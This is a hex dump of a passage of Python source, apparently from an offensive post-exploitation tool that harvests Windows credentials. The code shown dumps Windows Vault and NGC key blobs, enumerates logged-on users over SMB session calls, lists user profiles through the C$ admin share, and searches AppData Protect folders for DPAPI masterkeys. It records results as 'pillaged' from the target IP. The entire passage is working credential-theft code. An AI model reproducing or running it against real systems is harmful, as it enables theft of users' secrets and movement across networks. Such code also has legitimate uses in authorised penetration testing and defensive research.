+00011f20: 6c61 7469 6e2d 3127 297d 5c6e 220a 0909  latin-1')}\n"...
+00011f30: 0972 6574 7572 6e20 7265 7476 616c 0a09  .return retval..
+00011f40: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
+00011f50: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
+00011f60: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00011f70: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00011f80: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00011f90: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
+00011fa0: 477d 4578 6365 7074 696f 6e20 6475 6d70  G}Exception dump
+00011fb0: 5f56 4155 4c54 5f57 494e 5f42 494f 5f4b  _VAULT_WIN_BIO_K
+00011fc0: 4559 207b 6263 6f6c 6f72 732e 454e 4443  EY {bcolors.ENDC
+00011fd0: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
+00011fe0: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
+00011ff0: 6465 6620 6475 6d70 5f56 4155 4c54 5f4e  def dump_VAULT_N
+00012000: 4743 5f4c 4f43 414c 5f41 4343 4f4f 554e  GC_LOCAL_ACCOOUN
+00012010: 5428 7365 6c66 2c20 7573 6572 2c20 6c6f  T(self, user, lo
+00012020: 6361 6c66 696c 652c 2076 6175 6c74 5f62  calfile, vault_b
+00012030: 6c6f 6229 3a0a 0909 7472 793a 0a09 0909  lob):...try:....
+00012040: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00012050: 7567 2822 4475 6d70 696e 6720 4e47 435f  ug("Dumping NGC_
+00012060: 4c4f 4341 4c5f 4143 434f 4f55 4e54 2069  LOCAL_ACCOOUNT i
+00012070: 6e66 6f20 746f 2066 696c 6522 290a 0909  nfo to file")...
+00012080: 0972 6574 7661 6c20 3d20 225c 6e5b 4e47  .retval = "\n[NG
+00012090: 4320 4c4f 4341 4c20 4143 434f 4f55 4e54  C LOCAL ACCOOUNT
+000120a0: 5d5c 6e22 0a09 0909 7265 7476 616c 202b  ]\n"....retval +
+000120b0: 3d20 2755 6e6c 6f63 6b4b 6579 2020 2020  = 'UnlockKey    
+000120c0: 3a20 2573 5c6e 2720 2520 6865 786c 6966  : %s\n' % hexlif
+000120d0: 7928 7661 756c 745f 626c 6f62 5b22 556e  y(vault_blob["Un
+000120e0: 6c6f 636b 4b65 7922 5d29 0a09 0909 7265  lockKey"])....re
+000120f0: 7476 616c 202b 3d20 2749 5620 2020 2020  tval += 'IV     
+00012100: 2020 2020 2020 3a20 2573 5c6e 2720 2520        : %s\n' % 
+00012110: 6865 786c 6966 7928 7661 756c 745f 626c  hexlify(vault_bl
+00012120: 6f62 5b22 4956 225d 290a 0909 0972 6574  ob["IV"])....ret
+00012130: 7661 6c20 2b3d 2027 4369 7068 6572 5465  val += 'CipherTe
+00012140: 7874 2020 203a 2025 735c 6e27 2025 2068  xt   : %s\n' % h
+00012150: 6578 6c69 6679 2876 6175 6c74 5f62 6c6f  exlify(vault_blo
+00012160: 625b 2243 6970 6865 7254 6578 7422 5d29  b["CipherText"])
+00012170: 0a09 0909 7265 7475 726e 2072 6574 7661  ....return retva
+00012180: 6c0a 0909 6578 6365 7074 2045 7863 6570  l...except Excep
+00012190: 7469 6f6e 2061 7320 6578 3a0a 0909 0973  tion as ex:....s
+000121a0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+000121b0: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
+000121c0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+000121d0: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
+000121e0: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
+000121f0: 756d 705f 4e47 435f 4c4f 4341 4c5f 4143  ump_NGC_LOCAL_AC
+00012200: 434f 4f55 4e54 207b 6263 6f6c 6f72 732e  COOUNT {bcolors.
+00012210: 454e 4443 7d22 290a 0909 0973 656c 662e  ENDC}")....self.
+00012220: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
+00012230: 290a 0a09 6465 6620 6475 6d70 5f56 4155  )...def dump_VAU
+00012240: 4c54 5f4e 4743 5f41 4343 4f4f 554e 5428  LT_NGC_ACCOOUNT(
+00012250: 7365 6c66 2c20 7573 6572 2c20 6c6f 6361  self, user, loca
+00012260: 6c66 696c 652c 2076 6175 6c74 5f62 6c6f  lfile, vault_blo
+00012270: 6229 3a0a 0909 7472 793a 0a09 0909 7365  b):...try:....se
+00012280: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00012290: 2822 4475 6d70 696e 6720 5641 554c 545f  ("Dumping VAULT_
+000122a0: 4e47 435f 4143 434f 4f55 4e54 2069 6e66  NGC_ACCOOUNT inf
+000122b0: 6f20 746f 2066 696c 6522 290a 0909 0972  o to file")....r
+000122c0: 6574 7661 6c20 3d20 225c 6e5b 4e47 4320  etval = "\n[NGC 
+000122d0: 5641 554c 545d 5c6e 220a 0909 0972 6574  VAULT]\n"....ret
+000122e0: 7661 6c20 2b3d 2027 5369 6420 2020 2020  val += 'Sid     
+000122f0: 2020 2020 203a 2025 735c 6e27 2025 2052       : %s\n' % R
+00012300: 5043 5f53 4944 2862 275c 7830 355c 7830  PC_SID(b'\x05\x0
+00012310: 305c 7830 305c 7830 3027 202b 2076 6175  0\x00\x00' + vau
+00012320: 6c74 5f62 6c6f 625b 2753 6964 275d 292e  lt_blob['Sid']).
+00012330: 666f 726d 6174 4361 6e6f 6e69 6361 6c28  formatCanonical(
+00012340: 290a 0909 0972 6574 7661 6c20 2b3d 2027  )....retval += '
+00012350: 4672 6965 6e64 6c79 204e 616d 653a 2025  Friendly Name: %
+00012360: 735c 6e27 2025 2076 6175 6c74 5f62 6c6f  s\n' % vault_blo
+00012370: 625b 274e 616d 6527 5d2e 6465 636f 6465  b['Name'].decode
+00012380: 2827 7574 662d 3136 6c65 2729 0a09 0909  ('utf-16le')....
+00012390: 2320 4120 636f 6d70 6c65 7465 7220 3f0a  # A completer ?.
+000123a0: 0909 0976 6175 6c74 5f62 6c6f 625b 2742  ...vault_blob['B
+000123b0: 6c6f 6227 5d2e 6475 6d70 2829 0a0a 0909  lob'].dump()....
+000123c0: 0972 6574 7572 6e20 7265 7476 616c 0a09  .return retval..
+000123d0: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
+000123e0: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
+000123f0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00012400: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00012410: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00012420: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
+00012430: 477d 4578 6365 7074 696f 6e20 6475 6d70  G}Exception dump
+00012440: 5f56 4155 4c54 5f4e 4743 5f41 4343 4f4f  _VAULT_NGC_ACCOO
+00012450: 554e 547b 6263 6f6c 6f72 732e 454e 4443  UNT{bcolors.ENDC
+00012460: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
+00012470: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
+00012480: 6465 6620 646f 5f77 686f 2873 656c 6629  def do_who(self)
+00012490: 3a0a 0909 2320 6966 2073 656c 662e 6c6f  :...# if self.lo
+000124a0: 6767 6564 496e 2069 7320 4661 6c73 653a  ggedIn is False:
+000124b0: 0a09 0923 0973 656c 662e 6c6f 6767 696e  ...#.self.loggin
+000124c0: 672e 6572 726f 7228 224e 6f74 206c 6f67  g.error("Not log
+000124d0: 6765 6420 696e 2229 0a09 0923 0972 6574  ged in")...#.ret
+000124e0: 7572 6e0a 0909 7270 6374 7261 6e73 706f  urn...rpctranspo
+000124f0: 7274 203d 2074 7261 6e73 706f 7274 2e53  rt = transport.S
+00012500: 4d42 5472 616e 7370 6f72 7428 7365 6c66  MBTransport(self
+00012510: 2e73 6d62 2e67 6574 5265 6d6f 7465 486f  .smb.getRemoteHo
+00012520: 7374 2829 2c20 6669 6c65 6e61 6d65 3d72  st(), filename=r
+00012530: 275c 7372 7673 7663 272c 0a09 0909 0909  '\srvsvc',......
+00012540: 0909 0909 0909 2020 736d 625f 636f 6e6e  ......  smb_conn
+00012550: 6563 7469 6f6e 3d73 656c 662e 736d 6229  ection=self.smb)
+00012560: 0a09 0964 6365 203d 2072 7063 7472 616e  ...dce = rpctran
+00012570: 7370 6f72 742e 6765 745f 6463 655f 7270  sport.get_dce_rp
+00012580: 6328 290a 0909 6463 652e 636f 6e6e 6563  c()...dce.connec
+00012590: 7428 290a 0909 6463 652e 6269 6e64 2873  t()...dce.bind(s
+000125a0: 7276 732e 4d53 5250 435f 5555 4944 5f53  rvs.MSRPC_UUID_S
+000125b0: 5256 5329 0a09 0972 6573 7020 3d20 7372  RVS)...resp = sr
+000125c0: 7673 2e68 4e65 7472 5365 7373 696f 6e45  vs.hNetrSessionE
+000125d0: 6e75 6d28 6463 652c 204e 554c 4c2c 204e  num(dce, NULL, N
+000125e0: 554c 4c2c 2031 3029 0a0a 0909 666f 7220  ULL, 10)....for 
+000125f0: 7365 7373 696f 6e20 696e 2072 6573 705b  session in resp[
+00012600: 2749 6e66 6f53 7472 7563 7427 5d5b 2753  'InfoStruct']['S
+00012610: 6573 7369 6f6e 496e 666f 275d 5b27 4c65  essionInfo']['Le
+00012620: 7665 6c31 3027 5d5b 2742 7566 6665 7227  vel10']['Buffer'
+00012630: 5d3a 0a09 0909 7365 6c66 2e6c 6f67 6769  ]:....self.loggi
+00012640: 6e67 2e69 6e66 6f28 2268 6f73 743a 2025  ng.info("host: %
+00012650: 3135 732c 2075 7365 723a 2025 3573 2c20  15s, user: %5s, 
+00012660: 6163 7469 7665 3a20 2535 642c 2069 646c  active: %5d, idl
+00012670: 653a 2025 3564 2220 2520 280a 0909 0909  e: %5d" % (.....
+00012680: 7365 7373 696f 6e5b 2773 6573 6931 305f  session['sesi10_
+00012690: 636e 616d 6527 5d5b 3a2d 315d 2c20 7365  cname'][:-1], se
+000126a0: 7373 696f 6e5b 2773 6573 6931 305f 7573  ssion['sesi10_us
+000126b0: 6572 6e61 6d65 275d 5b3a 2d31 5d2c 2073  ername'][:-1], s
+000126c0: 6573 7369 6f6e 5b27 7365 7369 3130 5f74  ession['sesi10_t
+000126d0: 696d 6527 5d2c 0a09 0909 0973 6573 7369  ime'],.....sessi
+000126e0: 6f6e 5b27 7365 7369 3130 5f69 646c 655f  on['sesi10_idle_
+000126f0: 7469 6d65 275d 2929 0a09 0909 7365 6c66  time']))....self
+00012700: 2e64 622e 6164 645f 636f 6e6e 6563 7465  .db.add_connecte
+00012710: 645f 7573 6572 2875 7365 726e 616d 653d  d_user(username=
+00012720: 7365 7373 696f 6e5b 2773 6573 6931 305f  session['sesi10_
+00012730: 7573 6572 6e61 6d65 275d 5b3a 2d31 5d2c  username'][:-1],
+00012740: 2069 703d 7365 7373 696f 6e5b 2773 6573   ip=session['ses
+00012750: 6931 305f 636e 616d 6527 5d5b 3a2d 315d  i10_cname'][:-1]
+00012760: 290a 0a09 6465 6620 6765 745f 7573 6572  )...def get_user
+00012770: 7328 7365 6c66 293a 0a09 0973 656c 662e  s(self):...self.
+00012780: 6c6f 6767 696e 672e 6465 6275 6728 224c  logging.debug("L
+00012790: 6973 7469 6e67 2055 7365 7273 2062 7920  isting Users by 
+000127a0: 656e 756d 6572 6174 696e 6720 6469 7265  enumerating dire
+000127b0: 6374 6f72 6965 7320 696e 2024 5368 6172  ctories in $Shar
+000127c0: 655c 5c55 7365 7273 2229 0a09 0962 6c61  e\\Users")...bla
+000127d0: 636b 6c69 7374 203d 205b 272e 272c 2027  cklist = ['.', '
+000127e0: 2e2e 272c 2027 6465 736b 746f 702e 696e  ..', 'desktop.in
+000127f0: 6927 5d0a 0909 7368 6172 6573 203d 2073  i']...shares = s
+00012800: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
+00012810: 745f 7368 6172 6573 2829 0a09 0923 2049  t_shares()...# I
+00012820: 6e74 c3a9 6772 6572 206c 6573 2075 7365  nt..grer les use
+00012830: 7273 2073 6861 7265 2064 7520 7072 656d  rs share du prem
+00012840: 6965 7220 7465 7374 0a09 0969 6620 2743  ier test...if 'C
+00012850: 2427 2069 6e20 7368 6172 6573 3a20 2023  $' in shares:  #
+00012860: 204d 6f73 7420 6c69 6b65 6c79 0a09 0909   Most likely....
+00012870: 7365 6c66 2e6d 7966 696c 656f 7073 2e64  self.myfileops.d
+00012880: 6f5f 7573 6528 2743 2427 290a 0909 0923  o_use('C$')....#
+00012890: 2073 656c 662e 6d79 6669 6c65 6f70 732e   self.myfileops.
+000128a0: 7077 6420 3d20 2755 7365 7273 270a 0909  pwd = 'Users'...
+000128b0: 0963 6f6d 706c 6574 696f 6e20 3d20 7365  .completion = se
+000128c0: 6c66 2e6d 7966 696c 656f 7073 2e64 6f5f  lf.myfileops.do_
+000128d0: 6c73 2827 5573 6572 7327 2c20 272a 272c  ls('Users', '*',
+000128e0: 2064 6973 706c 6179 3d46 616c 7365 290a   display=False).
+000128f0: 0909 0966 6f72 2069 6e66 6f73 2069 6e20  ...for infos in 
+00012900: 636f 6d70 6c65 7469 6f6e 3a0a 0909 0909  completion:.....
+00012910: 6c6f 6e67 6e61 6d65 2c20 6973 5f64 6972  longname, is_dir
+00012920: 6563 746f 7279 203d 2069 6e66 6f73 0a09  ectory = infos..
+00012930: 0909 0969 6620 6973 5f64 6972 6563 746f  ...if is_directo
+00012940: 7279 2061 6e64 206c 6f6e 676e 616d 6520  ry and longname 
+00012950: 6e6f 7420 696e 2062 6c61 636b 6c69 7374  not in blacklist
+00012960: 3a0a 0909 0909 0966 6f72 2075 7365 7220  :......for user 
+00012970: 696e 2073 656c 662e 7573 6572 733a 0a09  in self.users:..
+00012980: 0909 0909 0969 6620 6c6f 6e67 6e61 6d65  .....if longname
+00012990: 203d 3d20 7573 6572 2e75 7365 726e 616d   == user.usernam
+000129a0: 653a 0a09 0909 0909 0909 6272 6561 6b0a  e:........break.
+000129b0: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+000129c0: 0973 656c 662e 7573 6572 732e 6170 7065  .self.users.appe
+000129d0: 6e64 284d 7955 7365 7228 6c6f 6e67 6e61  nd(MyUser(longna
+000129e0: 6d65 2c20 7365 6c66 2e6c 6f67 6769 6e67  me, self.logging
+000129f0: 2c20 7365 6c66 2e6f 7074 696f 6e73 2929  , self.options))
+00012a00: 0a09 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+00012a10: 696e 672e 696e 666f 280a 0909 0909 0909  ing.info(.......
+00012a20: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+00012a30: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
+00012a40: 5d20 466f 756e 6420 7573 6572 207b 6263  ] Found user {bc
+00012a50: 6f6c 6f72 732e 4f4b 424c 5545 7d7b 6c6f  olors.OKBLUE}{lo
+00012a60: 6e67 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ngname}{bcolors.
+00012a70: 454e 4443 7d22 290a 0909 0909 0909 7573  ENDC}").......us
+00012a80: 6572 203d 2073 656c 662e 4765 7455 7365  er = self.GetUse
+00012a90: 7242 794e 616d 6528 6c6f 6e67 6e61 6d65  rByName(longname
+00012aa0: 290a 0909 0909 0909 7365 6c66 2e64 622e  ).......self.db.
+00012ab0: 6164 645f 7573 6572 2875 7365 726e 616d  add_user(usernam
+00012ac0: 653d 7573 6572 2e75 7365 726e 616d 652c  e=user.username,
+00012ad0: 2070 696c 6c61 6765 645f 6672 6f6d 5f63   pillaged_from_c
+00012ae0: 6f6d 7075 7465 725f 6970 3d73 656c 662e  omputer_ip=self.
+00012af0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00012b00: 7029 0a09 0909 0909 0975 7365 722e 7368  p).......user.sh
+00012b10: 6172 6520 3d20 2743 2427 0a09 0965 6c73  are = 'C$'...els
+00012b20: 653a 0a09 0909 666f 7220 7368 6172 6520  e:....for share 
+00012b30: 696e 2073 6861 7265 733a 0a09 0909 0973  in shares:.....s
+00012b40: 656c 662e 6d79 6669 6c65 6f70 732e 646f  elf.myfileops.do
+00012b50: 5f75 7365 2873 6861 7265 290a 0909 0909  _use(share).....
+00012b60: 2320 7365 6c66 2e70 7764 203d 2027 5573  # self.pwd = 'Us
+00012b70: 6572 7327 0a09 0909 0963 6f6d 706c 6574  ers'.....complet
+00012b80: 696f 6e20 3d20 7365 6c66 2e6d 7966 696c  ion = self.myfil
+00012b90: 656f 7073 2e64 6f5f 6c73 2827 5573 6572  eops.do_ls('User
+00012ba0: 7327 2c20 272a 272c 2064 6973 706c 6179  s', '*', display
+00012bb0: 3d46 616c 7365 290a 0909 0909 666f 7220  =False).....for 
+00012bc0: 696e 666f 7320 696e 2063 6f6d 706c 6574  infos in complet
+00012bd0: 696f 6e3a 0a09 0909 0909 6c6f 6e67 6e61  ion:......longna
+00012be0: 6d65 2c20 6973 5f64 6972 6563 746f 7279  me, is_directory
+00012bf0: 203d 2069 6e66 6f73 0a09 0909 0909 6966   = infos......if
+00012c00: 2069 735f 6469 7265 6374 6f72 7920 616e   is_directory an
+00012c10: 6420 6c6f 6e67 6e61 6d65 206e 6f74 2069  d longname not i
+00012c20: 6e20 626c 6163 6b6c 6973 743a 0a09 0909  n blacklist:....
+00012c30: 0909 0966 6f72 2075 7365 7220 696e 2073  ...for user in s
+00012c40: 656c 662e 7573 6572 733a 0a09 0909 0909  elf.users:......
+00012c50: 0909 6966 206c 6f6e 676e 616d 6520 3d3d  ..if longname ==
+00012c60: 2075 7365 725b 2775 7365 726e 616d 6527   user['username'
+00012c70: 5d3a 0a09 0909 0909 0909 0962 7265 616b  ]:.........break
+00012c80: 0a09 0909 0909 0965 6c73 653a 0a09 0909  .......else:....
+00012c90: 0909 0909 7365 6c66 2e75 7365 7273 2e61  ....self.users.a
+00012ca0: 7070 656e 6428 4d79 5573 6572 286c 6f6e  ppend(MyUser(lon
+00012cb0: 676e 616d 652c 2073 656c 662e 6c6f 6767  gname, self.logg
+00012cc0: 696e 672c 2073 656c 662e 6f70 7469 6f6e  ing, self.option
+00012cd0: 7329 290a 0909 0909 0909 0973 656c 662e  s))........self.
+00012ce0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+00012cf0: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+00012d00: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00012d10: 707d 5d20 466f 756e 6420 7573 6572 207b  p}] Found user {
+00012d20: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d7b  bcolors.OKBLUE}{
+00012d30: 6c6f 6e67 6e61 6d65 7d7b 6263 6f6c 6f72  longname}{bcolor
+00012d40: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
+00012d50: 0975 7365 7220 3d20 7365 6c66 2e47 6574  .user = self.Get
+00012d60: 5573 6572 4279 4e61 6d65 286c 6f6e 676e  UserByName(longn
+00012d70: 616d 6529 0a09 0909 0909 0909 7365 6c66  ame)........self
+00012d80: 2e64 622e 6164 645f 7573 6572 2875 7365  .db.add_user(use
+00012d90: 726e 616d 653d 7573 6572 2e75 7365 726e  rname=user.usern
+00012da0: 616d 652c 2070 696c 6c61 6765 645f 6672  ame, pillaged_fr
+00012db0: 6f6d 5f63 6f6d 7075 7465 725f 6970 3d73  om_computer_ip=s
+00012dc0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00012dd0: 6574 5f69 7029 0a09 0909 0909 0909 7573  et_ip)........us
+00012de0: 6572 2e73 6861 7265 203d 2073 6861 7265  er.share = share
+00012df0: 0a09 0923 202b 4144 4420 4c4f 4341 4c20  ...# +ADD LOCAL 
+00012e00: 4d41 4348 494e 4520 4143 434f 554e 540a  MACHINE ACCOUNT.
+00012e10: 0909 7573 6572 203d 204d 7955 7365 7228  ..user = MyUser(
+00012e20: 224d 4143 4849 4e45 2422 2c20 7365 6c66  "MACHINE$", self
+00012e30: 2e6c 6f67 6769 6e67 2c20 7365 6c66 2e6f  .logging, self.o
+00012e40: 7074 696f 6e73 290a 0909 7573 6572 2e74  ptions)...user.t
+00012e50: 7970 6520 3d20 274d 4143 4849 4e45 270a  ype = 'MACHINE'.
+00012e60: 0909 7573 6572 2e73 6861 7265 203d 2027  ..user.share = '
+00012e70: 4324 270a 0909 7365 6c66 2e75 7365 7273  C$'...self.users
+00012e80: 2e61 7070 656e 6428 7573 6572 290a 0909  .append(user)...
+00012e90: 7365 6c66 2e64 622e 6164 645f 7573 6572  self.db.add_user
+00012ea0: 2875 7365 726e 616d 653d 7573 6572 2e75  (username=user.u
+00012eb0: 7365 726e 616d 652c 2070 696c 6c61 6765  sername, pillage
+00012ec0: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
+00012ed0: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
+00012ee0: 7461 7267 6574 5f69 7029 0a09 0972 6574  target_ip)...ret
+00012ef0: 7572 6e20 7365 6c66 2e75 7365 7273 0a0a  urn self.users..
+00012f00: 0964 6566 2067 6574 5f6d 6173 7465 726b  .def get_masterk
+00012f10: 6579 7328 7365 6c66 293a 0a09 0973 656c  eys(self):...sel
+00012f20: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00012f30: 0a09 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00012f40: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00012f50: 207b 6263 6f6c 6f72 732e 4f4b 424c 5545   {bcolors.OKBLUE
+00012f60: 7d5b 2b5d 2047 6174 6865 7269 6e67 206d  }[+] Gathering m
+00012f70: 6173 7465 726b 6579 7320 6f6e 2074 6865  asterkeys on the
+00012f80: 2074 6172 6765 747b 6263 6f6c 6f72 732e   target{bcolors.
+00012f90: 454e 4443 7d22 290a 0909 626c 6163 6b6c  ENDC}")...blackl
+00012fa0: 6973 7420 3d20 5b27 2e27 2c20 272e 2e27  ist = ['.', '..'
+00012fb0: 5d0a 0909 2320 7365 6c66 2e67 6574 5f73  ]...# self.get_s
+00012fc0: 6861 7265 7328 290a 0909 2320 7365 6c66  hares()...# self
+00012fd0: 2e67 6574 5f75 7365 7273 2829 0a09 0966  .get_users()...f
+00012fe0: 6f72 2075 7365 7220 696e 2073 656c 662e  or user in self.
+00012ff0: 7573 6572 733a 0a09 0909 6966 2075 7365  users:....if use
+00013000: 722e 7573 6572 6e61 6d65 2021 3d20 274d  r.username != 'M
+00013010: 4143 4849 4e45 2427 3a0a 0909 0909 7472  ACHINE$':.....tr
+00013020: 793a 0a09 0909 0909 746d 705f 7077 6420  y:......tmp_pwd 
+00013030: 3d20 6e74 7061 7468 2e6a 6f69 6e28 6e74  = ntpath.join(nt
+00013040: 7061 7468 2e6a 6f69 6e28 2755 7365 7273  path.join('Users
+00013050: 272c 2075 7365 722e 7573 6572 6e61 6d65  ', user.username
+00013060: 292c 2027 4170 7044 6174 615c 5c52 6f61  ), 'AppData\\Roa
+00013070: 6d69 6e67 5c5c 4d69 6372 6f73 6f66 745c  ming\\Microsoft\
+00013080: 5c50 726f 7465 6374 2729 0a09 0909 0909  \Protect')......
+00013090: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+000130a0: 7567 280a 0909 0909 0909 6622 5b7b 7365  ug(.......f"[{se
+000130b0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+000130c0: 745f 6970 7d5d 204c 6f6f 6b69 6e67 2066  t_ip}] Looking f
+000130d0: 6f72 207b 6263 6f6c 6f72 732e 4f4b 424c  or {bcolors.OKBL
+000130e0: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
+000130f0: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
+00013100: 204d 6173 7465 726b 6579 2069 6e20 2573   Masterkey in %s
+00013110: 2220 2520 746d 705f 7077 6429 0a09 0909  " % tmp_pwd)....
+00013120: 0909 6d79 5f64 6972 6563 746f 7279 203d  ..my_directory =
+00013130: 2073 656c 662e 6d79 6669 6c65 6f70 732e   self.myfileops.
+00013140: 646f 5f6c 7328 746d 705f 7077 642c 2027  do_ls(tmp_pwd, '
+00013150: 272c 2064 6973 706c 6179 3d54 7275 6529  ', display=True)
+00013160: 0a09 0909 0909 666f 7220 696e 666f 7320  ......for infos 
+00013170: 696e 206d 795f 6469 7265 6374 6f72 793a  in my_directory:
+00013180: 0a09 0909 0909 0974 7279 3a0a 0909 0909  .......try:.....
+00013190: 0909 096c 6f6e 676e 616d 652c 2069 735f  ...longname, is_
+000131a0: 6469 7265 6374 6f72 7920 3d20 696e 666f  directory = info
+000131b0: 730a 0909 0909 0909 0969 6620 6c6f 6e67  s........if long
+000131c0: 6e61 6d65 206e 6f74 2069 6e20 626c 6163  name not in blac
+000131d0: 6b6c 6973 743a 0a09 0909 0909 0909 0973  klist:.........s
+000131e0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+000131f0: 6728 6622 5b7b 7365 6c66 2e6f 7074 696f  g(f"[{self.optio
+00013200: 6e73 2e74 6172 6765 745f 6970 7d5d 2041  ns.target_ip}] A
+00013210: 6e61 6c79 7369 6e67 207b 6c6f 6e67 6e61  nalysing {longna
+00013220: 6d65 7d20 666f 7220 4d61 7374 6572 6b65  me} for Masterke
+00013230: 7973 2229 0a09 0909 0909 0909 0969 6620  ys").........if 
+00013240: 6973 5f64 6972 6563 746f 7279 2061 6e64  is_directory and
+00013250: 206c 6f6e 676e 616d 655b 3a32 5d20 3d3d   longname[:2] ==
+00013260: 2027 532d 273a 2020 2320 5349 440a 0909   'S-':  # SID...
+00013270: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+00013280: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
+00013290: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+000132a0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+000132b0: 5d20 7b62 636f 6c6f 7273 2e4f 4b42 4c55  ] {bcolors.OKBLU
+000132c0: 457d 7b75 7365 722e 7573 6572 6e61 6d65  E}{user.username
+000132d0: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d20  }{bcolors.ENDC} 
+000132e0: 2d20 466f 756e 6420 5349 4420 7b6c 6f6e  - Found SID {lon
+000132f0: 676e 616d 657d 2229 0a09 0909 0909 0909  gname}")........
+00013300: 0909 7573 6572 2e73 6964 203d 206c 6f6e  ..user.sid = lon
+00013310: 676e 616d 650a 0909 0909 0909 0909 0969  gname..........i
+00013320: 6620 7573 6572 2e73 6964 2e73 7461 7274  f user.sid.start
+00013330: 7377 6974 6828 2753 2d31 2d35 2d38 3027  swith('S-1-5-80'
+00013340: 293a 0a09 0909 0909 0909 0909 0973 656c  ):...........sel
+00013350: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00013360: 0a09 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
+00013370: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00013380: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00013390: 732e 4641 494c 7d7b 7573 6572 2e75 7365  s.FAIL}{user.use
+000133a0: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
+000133b0: 4e44 437d 202d 2046 6f75 6e64 2041 4420  NDC} - Found AD 
+000133c0: 434f 4e4e 4543 5420 5349 4420 7b6c 6f6e  CONNECT SID {lon
+000133d0: 676e 616d 657d 2229 0a09 0909 0909 0909  gname}")........
+000133e0: 0909 0975 7365 722e 6973 5f61 6463 6f6e  ...user.is_adcon
+000133f0: 6e65 6374 203d 2054 7275 650a 0909 0909  nect = True.....
+00013400: 0909 0909 0923 2075 7365 722e 6368 6563  .....# user.chec
+00013410: 6b5f 7573 6572 7479 7065 2829 0a09 0909  k_usertype()....
+00013420: 0909 0909 0909 746d 705f 7077 6432 203d  ......tmp_pwd2 =
+00013430: 206e 7470 6174 682e 6a6f 696e 2874 6d70   ntpath.join(tmp
+00013440: 5f70 7764 2c20 6c6f 6e67 6e61 6d65 290a  _pwd, longname).
+00013450: 0909 0909 0909 0909 096d 795f 6469 7265  .........my_dire
+00013460: 6374 6f72 7932 203d 2073 656c 662e 6d79  ctory2 = self.my
+00013470: 6669 6c65 6f70 732e 646f 5f6c 7328 746d  fileops.do_ls(tm
+00013480: 705f 7077 6432 2c20 2727 2c20 6469 7370  p_pwd2, '', disp
+00013490: 6c61 793d 4661 6c73 6529 0a09 0909 0909  lay=False)......
+000134a0: 0909 0909 666f 7220 696e 666f 7332 2069  ....for infos2 i
+000134b0: 6e20 6d79 5f64 6972 6563 746f 7279 323a  n my_directory2:
+000134c0: 0a09 0909 0909 0909 0909 096c 6f6e 676e  ...........longn
+000134d0: 616d 6532 2c20 6973 5f64 6972 6563 746f  ame2, is_directo
+000134e0: 7279 3220 3d20 696e 666f 7332 0a09 0909  ry2 = infos2....
+000134f0: 0909 0909 0909 0969 6620 6e6f 7420 6973  .......if not is
